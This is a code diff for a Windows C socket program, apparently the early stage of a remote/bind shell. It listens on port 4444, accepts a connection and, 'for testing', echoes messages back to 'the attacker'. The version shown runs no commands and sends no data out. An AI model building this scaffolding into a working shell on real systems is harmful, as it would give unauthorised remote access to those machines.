@@ -2,12 +2,13 @@
 #include <stdlib.h>
 #include <string.h>
 
-#include <windows.h>
 #include <winsock2.h>
+#include <windows.h>
 #include <ws2tcpip.h>
 
 // Need to link with Ws2_32.lib
-#pragma comment (lib, "Ws2_32.lib")
+// unfortunately this does not work, so when compiling we manually tell gcc to use this library to compile with the "-lws2_32" option.
+#pragma comment (lib, "ws2_32.lib")
 
 
 
@@ -16,10 +17,10 @@
 #define xstr(s) str(s)
 #define str(s) #s
 
+int startShell();
+
 int port;
 char * ip;
-
-// more networking stuff
 
 int main(){
     port = 4444;  // default value
@@ -37,7 +38,7 @@ int main(){
     printf("Port: %d\n", port);
     printf("IP: %s\n", ip);
 
-    // startShell();
+    startShell();
 
     free(ip);
 
@@ -80,16 +81,41 @@ int startShell() {
     // wait for a connection
     struct sockaddr_in client;
     int clientSize = sizeof(client);
+    printf("Blocking now...");
     SOCKET clientSocket = accept(sock, (struct sockaddr*)&client, &clientSize);
+    printf("End blocking now...");
 
     // the connected host's ip
     char client_ip[NI_MAXHOST];
-    memset(client_ip, "\0", sizeof(client_ip));
+    memset(client_ip, 0, sizeof(client_ip));
 
     inet_ntop(AF_INET, &client.sin_addr, client_ip, NI_MAXHOST);
-    printf("%s connected on port __(fill this in)", client_ip);
+    printf("%s connected on port %d", client_ip, port);
 
-    for (;;){
-        
+    // close listening port once a connected has been recieved
+    closesocket(sock);
+
+    // FOR TESTING JUST ECHO MESSAGE BACK TO THE ATTACKER
+
+    char buf[4096];
+    while (TRUE){
+        printf("In the while loop!");
+        memset(buf, 0, sizeof(buf));
+        int bytesRecieved = recv(clientSocket, buf, 4096, 0); // this function returns the length of the message in bytes
+        if (bytesRecieved == SOCKET_ERROR){
+            printf("Error recieving data. Exiting...");
+            break;
+        } else if (bytesRecieved == 0){
+            printf("Client disconnected. Exiting...");
+            break;
+        }
+
+        // send message back to the client
+        send(clientSocket, buf, bytesRecieved + 1, 0);
+    
     }
+
+    closesocket(clientSocket);
+    WSACleanup();
+    
 }
